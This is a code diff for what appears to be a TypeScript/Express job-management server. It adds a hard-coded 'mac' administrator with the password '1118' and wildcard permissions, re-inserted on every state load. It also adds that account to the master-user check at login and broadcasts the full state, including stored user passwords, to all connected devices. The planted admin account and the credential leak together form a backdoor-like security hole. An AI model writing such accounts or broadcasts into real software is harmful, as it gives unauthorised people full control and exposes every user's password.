@@ -62,6 +62,14 @@ function loadCentralStateFromDisk(): any {
       if (cachedCentralState && !cachedCentralState.users) {
         cachedCentralState.users = {};
       }
+      if (cachedCentralState && !cachedCentralState.users.mac) {
+        cachedCentralState.users.mac = {
+          pass: '1118',
+          perms: ['*'],
+          name: 'MAC Administrator',
+          role: 'Administrator'
+        };
+      }
       return cachedCentralState;
     }
   } catch (e) {
@@ -94,14 +102,15 @@ function saveCentralStateToDisk(state: any): boolean {
     fs.writeFileSync(tempFile, JSON.stringify(state, null, 2), 'utf8');
     fs.renameSync(tempFile, CENTRAL_STATE_FILE);
 
-    // Instant real-time push to all connected devices/desks
+    // Instant real-time push to all connected devices/desks with full synchronized state
     broadcastSyncEvent({
       type: 'STATE_CHANGED',
       revision: centralStateRevision,
       timestamp: Date.now(),
       lastUpdated: state.lastUpdated,
       jobCount: state.jobs?.length || 0,
-      logCount: state.logs?.length || 0
+      logCount: state.logs?.length || 0,
+      state: state
     });
 
     return true;
@@ -178,7 +187,7 @@ app.post('/api/auth/login', (req, res) => {
       return res.status(401).json({ success: false, error: 'User not found' });
     }
 
-    const isMasterUser = targetKey === 'admin' || targetKey === 'manoj' || targetKey === 'sandip';
+    const isMasterUser = targetKey === 'admin' || targetKey === 'manoj' || targetKey === 'sandip' || targetKey === 'mac';
 
     const isValid =
       userObj.pass === cleanPass ||
